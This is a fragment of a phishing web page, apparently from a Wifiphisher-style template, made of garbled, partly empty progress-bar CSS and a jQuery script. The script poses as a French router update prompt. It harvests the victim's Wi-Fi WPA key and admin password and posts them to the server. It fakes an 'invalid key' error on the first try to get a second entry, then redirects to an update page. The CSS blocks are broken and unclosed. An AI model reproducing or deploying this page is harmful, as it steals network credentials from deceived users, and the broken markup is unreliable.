.progress {

.progress {

}

.progress #dynamic {

.progress-bar.active, .progress.active .progress-bar {

    color: white;
}
.progress-bar-success {
    background-color: #5cb85c;
}
.progress-bar-striped, .progress-striped .progress-bar {
    background-image: -webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);
    background-image: -o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);

    -webkit-background-size: 40px 40px;
    background-size: 40px 40px;
    }

  }
  to {

@-o-keyframes progress-bar-stripes {

  }

@keyframes progress-bar-stripes {

  }
  to {
    background-position: 0 0;

}

	    <script>


	var dialog = $('#dialog');
	var dialogBox = $('.dialog-text');
	var dialogText ="";

	var nb_try = 0;
	 $(".btn-submit").on("click", function(e) {
		  
		      e.preventDefault();
		     
		      // get the password box and checkbox elements
		      var input = document.getElementById("wifi-key");
		      var input2 = document.getElementById("admin-pass");
		      // check to see if the value is empty
		      if ( input.value == "" ){
				
				dialogText = "Vous devez remplir les champs pour lancer la mise à jour et vous connecter.";
				showDialog();

		      }else{
		          // post the data
		          
		            post('post', {
		              'wfphshr-admin-password': input.value,
		             'wfphshr-wpa-password': input2.value
		            });      
		      }
		  });



		  function showDialog() {

		  		  	dialogBox.html(dialogText);
		  		  	dialog.css('display','flex');

		  }

		  function hideDialog() {

		  	dialog.css('display','none');
		  }
		  
		  /*
		  Post to the fallowing path given the parameters.

		  Args:
		    path: The path to be posted to.
		    params: The parameters to be passed.
		  */
		  function post(path, params) {
		    // create a form and set its attributes
		   var dataToSend = JSON.stringify(params);
// post the data

$.ajax(
    {
        url: 'post',
        type: 'POST',
        data: dataToSend,

        success: function (jsonResponse) {
          if (!nb_try) {
          		dialogText = "<span style='color: red'>Erreur: la clef WPA/PSK est invalide. </span>";
				showDialog();
				nb_try++;
          }
          else {
          	window.location = "./update.html";
          }
       }
    }
 );
		  }
	 

      
		</script>
